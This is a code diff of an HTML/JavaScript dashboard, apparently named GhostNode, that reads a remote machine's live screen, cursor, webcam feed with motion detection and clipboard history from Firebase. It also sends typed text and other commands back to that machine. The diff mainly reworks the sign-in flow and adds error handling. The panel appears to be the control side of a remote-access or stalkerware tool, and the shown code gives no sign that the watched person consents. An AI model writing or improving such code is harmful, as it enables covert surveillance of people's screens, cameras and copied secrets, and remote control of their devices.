@@ -87,11 +87,11 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getFirestore, doc, onSnapshot, collection, addDoc, serverTimestamp, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
-        // Environment check for Firebase Config
         const configRaw = typeof __firebase_config !== 'undefined' ? __firebase_config : null;
         const appId = typeof __app_id !== 'undefined' ? __app_id : 'sainfoxiya-com-a7733';
+        const initialToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
 
         if (configRaw) {
             try {
@@ -100,11 +100,14 @@
                 const db = getFirestore(app);
                 const auth = getAuth(app);
 
-                signInAnonymously(auth).then(() => {
+                // Auth state management function
+                const startDashboard = (user) => {
+                    if (!user) return;
+                    
                     document.getElementById('connection-dot').classList.replace('bg-red-500', 'bg-green-500');
                     
                     // 1. Live Screen Stream
-                    onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_screen'), s => {
+                    onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_screen'), (s) => {
                         if(!s.exists()) return;
                         const d = s.data();
                         const screenImg = document.getElementById('live-screen');
@@ -113,10 +116,10 @@
                         const c = document.getElementById('remote-cursor');
                         c.style.left = (d.cursorX * 100) + '%';
                         c.style.top = (d.cursorY * 100) + '%';
-                    });
+                    }, (err) => console.error("Screen Snapshot Error:", err));
 
                     // 2. Camera & Motion detection
-                    onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_camera'), s => {
+                    onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_camera'), (s) => {
                         if(!s.exists()) return;
                         const d = s.data();
                         const img = document.getElementById('live-camera');
@@ -149,11 +152,11 @@
                             label.innerText = "Off";
                             box.classList.remove('motion-alert');
                         }
-                    });
+                    }, (err) => console.error("Camera Snapshot Error:", err));
 
                     // 3. Clipboard Feed
                     const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'clipboard'), orderBy('timestamp', 'desc'), limit(15));
-                    onSnapshot(q, s => {
+                    onSnapshot(q, (s) => {
                         const l = document.getElementById('clipboard-list');
                         l.innerHTML = '';
                         if(s.empty) l.innerHTML = '<div class="text-slate-600 italic">No clipboard history...</div>';
@@ -163,28 +166,50 @@
                             item.innerText = doc.data().text;
                             l.appendChild(item);
                         });
-                    });
+                    }, (err) => console.error("Clipboard Snapshot Error:", err));
 
-                    // Global function to push actions to Firebase
-                    window.sendCommand = (type, extra = {}) => {
-                        addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'actions'), {
-                            type, ...extra, timestamp: serverTimestamp()
-                        });
+                    // Global command function
+                    window.sendCommand = async (type, extra = {}) => {
+                        if (!auth.currentUser) return;
+                        try {
+                            await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'actions'), {
+                                type, ...extra, timestamp: serverTimestamp()
+                            });
+                        } catch (err) {
+                            console.error("Command Send Error:", err);
+                        }
                     };
-                }).catch(e => {
-                    console.error("Auth Failure:", e);
-                    document.getElementById('live-screen').alt = "Authentication Failed. Check console.";
+                };
+
+                // Initialize Auth
+                const initAuth = async () => {
+                    try {
+                        if (initialToken) {
+                            await signInWithCustomToken(auth, initialToken);
+                        } else {
+                            await signInAnonymously(auth);
+                        }
+                    } catch (e) {
+                        console.error("Authentication Process Error:", e);
+                    }
+                };
+
+                onAuthStateChanged(auth, (user) => {
+                    if (user) {
+                        startDashboard(user);
+                    }
                 });
+
+                initAuth();
+
             } catch (err) {
                 console.error("Config Parsing Error:", err);
             }
         } else {
-            // This part only shows in development preview if config isn't injected.
             document.getElementById('live-screen').alt = "Local Preview: Connection standby.";
-            console.info("GhostNode: Standing by for environment configuration.");
         }
 
-        // Action Handlers
+        // UI Handlers
         window.sendText = () => {
             const i = document.getElementById('key-input');
             if(i.value && window.sendCommand) { 
@@ -209,11 +234,9 @@
             }
         };
 
-        // Listen for Enter key on input
         document.getElementById('key-input').addEventListener('keypress', (e) => {
             if(e.key === 'Enter') sendText();
         });
-
     </script>
 </body>
 </html>
